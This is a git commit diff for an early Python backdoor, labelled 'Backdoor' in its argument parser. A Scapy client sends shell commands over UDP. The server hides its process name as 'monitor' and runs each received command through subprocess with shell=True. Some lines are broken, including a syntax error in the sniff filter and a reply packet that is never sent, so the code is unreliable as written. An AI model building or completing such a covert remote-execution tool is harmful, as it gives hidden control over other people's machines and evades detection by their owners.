1b40e9aa3ef91167f5518ad4c4c6de6b08951cc0
Nishan <nishan@vivek.tech>
2017-10-26 13:26:53 -0700

    Initial Commits

--- client.py
+++ client.py
@@ -6,10 +6,10 @@ from scapy.layers.inet import IP, UDP
 
 #Argparse setup
 parser = argparse.ArgumentParser(description="Backdoor")
-parser.add_argument('-d', '--dest', dest='dest', help='Destination IP', required=True)
-parser.add_argument('-p', '--port', dest='port', help='Destination Port', required=True)
-parser.add_argument('-s', '-source', dest='source_ip', help='Source IP', required=True)
-parser.add_argument('-sp', '-source_port', dest='source_port', help='Source Port', required= True)
+parser.add_argument('-d', '--server_ip', dest='server_ip', help='Server IP', required=True)
+parser.add_argument('-p', '--server_port', dest='server_port', help='Server Port', required=True)
+parser.add_argument('-s', '--client_ip', dest='client_ip', help='Client IP', required=True)
+parser.add_argument('-sp', '--client_port', dest='client_port', help='Client Port', required= True)
 args = parser.parse_args()
 
 
@@ -24,12 +24,12 @@ def main():
 
 #Main command and display loop
     while 1:
-            command = raw_input("Command to send:") + "#" + args.source_ip
+            command = raw_input("Command to send:") + "#" + args.client_ip
             #print (command)
-            packet = IP(dst=args.dest, src=args.source_ip)/UDP(sport=int(args.source_port), dport=int(args.port))/command
+            packet = IP(dst=args.server_ip, src=args.client_ip)/UDP(sport=int(args.client_port), dport=int(args.server_port))/command
             print packet['Raw'].load
             send(packet)
-            sniff(filter="udp and src port " + args.port + " and dst port 8081", stop_filter=stp_filter)
+            sniff(filter="udp and src port " + args.server_port + " and dst port 8081", stop_filter=stp_filter)
 
 if __name__ == '__main__':
 	main()
--- server.py
+++ server.py
@@ -1,13 +1,29 @@
-import argparse, setproctitle
+import argparse, setproctitle, subprocess
 from scapy.all import *
 from Crypto.Cipher import AES
 from scapy.layers.inet import IP, UDP
 
+parser = argparse.ArgumentParser(description="Backdoor")
+parser.add_argument('-d', '--dest', dest='dest', help='Destination IP', required=True)
+parser.add_argument('-p', '--port', dest='port', help='Destination Port', required=True)
+parser.add_argument('-s', '-source', dest='source_ip', help='Source IP', required=True)
+parser.add_argument('-sp', '-source_port', dest='source_port', help='Source Port', required= True)
+args = parser.parse_args()
 
 
-
+def parse_command(packet):
+    payload = packet['Raw'].load
+    command = payload.split('#')[0]
+    client_ip = payload.split('#')[1]
+    proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
+    output = proc.stdout.read()
+    print (output)
+    pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(dport=packet['UDP'])
 
 
 def main():
     setproctitle.setproctitle("monitor")
-    sniff(filter)
+    sniff(filter="udp and dst port " + int(args.port) + and " src port " + int(args.source_port), prn=parse_command)
+
+if __name__ == '__main__':
+    main()
